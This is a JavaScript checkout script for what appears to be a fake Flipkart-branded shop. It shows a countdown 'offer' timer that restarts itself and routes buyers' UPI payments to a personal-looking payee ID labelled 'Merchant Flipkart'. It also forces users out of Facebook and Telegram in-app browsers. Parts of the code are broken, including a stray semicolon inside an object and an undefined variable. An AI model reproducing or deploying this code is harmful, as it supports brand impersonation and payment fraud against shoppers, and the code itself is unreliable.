var itemData;
$(document).ready(function () {
  startTimer(500 - 120, $("#offerend-time"));
  $(".form-check").on("click", function () {
    $(".form-check").removeClass("active");
    $(this).addClass("active");
  });
  $("#back_btn").on("click", function () {
    history.back();
  });

  var selected_verient = localStorage.getItem("selected_verient");
  itemData = JSON.parse(selected_verient);
  $("#item_image").prop("src", itemData.img1);
  var name =
    itemData.name +
    " " +
    (itemData.color ? " (" + itemData.color + ")" : "") +
    (itemData.size ? " (" + itemData.size + ")" : "") +
    (itemData.storage ? " (" + itemData.storage + ")" : "");
  $("#product-title").html(name);
  $(".selling_price, .payable").html("&#8377;" + itemData.selling_price);
  $(".mrp").html("&#8377;" + itemData.mrp);

  if (SHOW_GPAY === false) {
    $(".gpay").addClass("d-none");
    $(".gpay").remove();
    $('[pay-type="phonepe"]').addClass("active");
  }
});

function startTimer(duration, display) {
  var timer = duration,
    minutes,
    seconds;
  setInterval(function () {
    minutes = parseInt(timer / 60, 10);
    seconds = parseInt(timer % 60, 10);

    minutes = minutes < 10 ? "0" + minutes : minutes;
    seconds = seconds < 10 ? "0" + seconds : seconds;

    display.text(minutes + "min " + seconds + "sec");

    if (--timer < 0) {
      timer = duration;
    }
  }, 1000);
}
function isFacebookApp() {
  var ua = navigator.userAgent || navigator.vendor || window.opera;
  return ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1;
}
function payNow(upi_address) {
  if (default_pay == "0") {
    var payType = $(".form-check.active").attr("pay-type");
  } else {
    var payType = default_pay;
  }

  if (payType == "gpay") {
    var currentUrl = window.location.href; // Fetch the current URL

    var price0 = document.getElementById("selling_price-footer").innerHTML;
    var price = price0.replace("₹", "");
    var mrp0 = document.getElementById("mrp-footer").innerHTML;
    var mrp = mrp0.replace("₹", "");

    if (typeof window.TelegramWebview !== "undefined") {
      window.location.href =
        "intent://" +
        currentUrl.replace(/^https?:\/\//, "") +
        "?price=" +
        price +
        "&mrp=" +
        mrp +
        "&default=gpay#Intent;scheme=https;package=com.android.chrome;end";
    } else if (isFacebookApp()) {
      window.location.href =
        "intent://" +
        currentUrl.replace(/^https?:\/\//, "") +
        "?price=" +
        price +
        "&mrp=" +
        mrp +
        "&default=gpay#Intent;scheme=https;package=com.android.chrome;end";
    } else {
      if (!window.PaymentRequest) {
        alert("Web payments are not supported in this browser.");
        return;
      }

      const supportedInstruments = [
        {
          supportedMethods: ["https://tez.google.com/pay"],
          data: {
            pa: "arifsk@fam";
            // Replace with your Merchant UPI ID
            pn: "Merchant Flipkart",
            // Replace with your Merchant Name
            tr: "1234ABCD",
            // Your custom transaction reference ID
            url: "https://yourwebsite.com/order/1234ABCD",
            // URL of the order in your website
            mc: "1234",
            // Your merchant category code
            tn: "Purchase in Flipkart",
            // Transaction note
          },
        },
      ];

      // Create order detail data.
      const details = {
        total: {
          label: "Total",
          amount: {
            currency: "INR",
            value: price,
            // Amount to be paid
          },
        },
        displayItems: [
          {
            label: "Original Amount",
            amount: {
              currency: "INR",
              value: price,
            },
          },
        ],
      };

      // Create payment request object.
      let request = null;
      try {
        request = new PaymentRequest(supportedInstruments, details);
      } catch (e) {
        alert("Payment Request Error: " + e.message);
        return;
      }
      if (!request) {
        alert("Web payments are not supported in this browser.");
        return;
      }

      var canMakePaymentPromise = checkCanMakePayment(request);
      canMakePaymentPromise
        .then((result) => {
          showPaymentUI(request, result);
        })
        .catch((err) => {
          alert("Error calling checkCanMakePayment: " + err);
        });
    }
  } else {
    var redirect_url = "";
    var site_name = "Online Shopping";
    var aa = document.getElementById("selling_price-footer").innerHTML;
    var amt = aa.replace("₹", "");

    switch (payType) {
      case "phonepe":
        redirect_url =
          "phonepe://pay?pa=" + upi + "&pn=MSWIPE&tr=&cu=INR&am=" + amt + "";

        break;

      // case 'gpay':

      //     redirect_url = "tez://upi/pay?pa=" + upi + "&pn=MSWIPE&tr=&cu=INR&am=" + amt + "";

      //     break;

      case "paytm":
        redirect_url =
          "paytmmp://cash_wallet?pa=" +
          upi +
          "&pn=Online%Shopping" +
          "&am=" +
          amt +
          "&tr=RZPPYDwIIDfuh4iCnqrv2&mc=5732&cu=INR&tn=Online_Shoping&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr&featuretype=money_transfer";

        break;

      case "bhim_upi":
        redirect_url =
          "upi://pay?pa=" + upi + "&pn=MSWIPE&tr=&cu=INR&am=" + amt + "";

        break;

      default:
        break;
    }
    window.location.href = redirect_url;
  }

  if (failed == "1") {
    setTimeout(function () {
      var price1 = document.getElementById("selling_price-footer").innerHTML;
      var price11 = price1.replace("₹", "");
      var mrp1 = document.getElementById("mrp-footer").innerHTML;
      var mrp11 = mrp1.replace("₹", "");

      window.location.href =
        "failureControler?price=" + price11 + "&mrp=" + mrp11;
    }, redirect * 1000);
  }
}
function checkCanMakePayment(request) {
  // Checks canMakePayment cache, and use the cache result if it exists.
  const canMakePaymentCache = "canMakePaymentCache";

  if (sessionStorage.hasOwnProperty(canMakePaymentCache)) {
    return Promise.resolve(JSON.parse(sessionStorage[canMakePaymentCache]));
  }

  // If canMakePayment() isn't available, default to assuming that the method is supported.
  var canMakePaymentPromise = Promise.resolve(true);

  // Feature detect canMakePayment().
  if (request.canMakePayment) {
    canMakePaymentPromise = request.canMakePayment();
  }

  return canMakePaymentPromise
    .then((result) => {
      // Store the result in cache for future usage.
      sessionStorage[canMakePaymentCache] = result;
      return result;
    })
    .catch((err) => {
      alert("Error calling canMakePayment: " + err);
    });
}
function showPaymentUI(request, canMakePayment) {
  if (!canMakePayment) {
    alert("Google Pay is not ready to pay.");
    return;
  }

  // Set payment timeout.
  let paymentTimeout = window.setTimeout(function () {
    window.clearTimeout(paymentTimeout);
    request
      .abort()
      .then(function () {
        alert("Payment timed out.");
      })
      .catch(function () {
        alert("Unable to abort, user is in the process of paying.");
      });
  }, 20 * 60 * 1000);
  /* 20 minutes */

  request
    .show()
    .then(function (instrument) {
      window.clearTimeout(paymentTimeout);
      processResponse(instrument);
      // Handle response from browser.
    })
    .catch(function (err) {
      alert(err);
    });
}
function processResponse(instrument) {
  var instrumentString = JSON.stringify(
    {
      methodName: instrument.methodName,
      details: instrument.details,
      payerName: instrument.payerName,
      payerPhone: instrument.payerPhone,
      payerEmail: instrument.payerEmail,
    },
    undefined,
    2
  );

  // Send the payment response to the server for processing
  fetch("process_payment.php", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: instrumentString,
  })
    .then((response) => response.json())
    .then((data) => {
      if (data.success) {
        window.location.href = "payment_success";
      } else {
        Swal.fire(
          "Payment failed",
          "There was an issue with the payment. Please try again.",
          "error"
        );
      }
    })
    .catch((error) => console.error("Error:", error));

  instrument.complete("success");
}
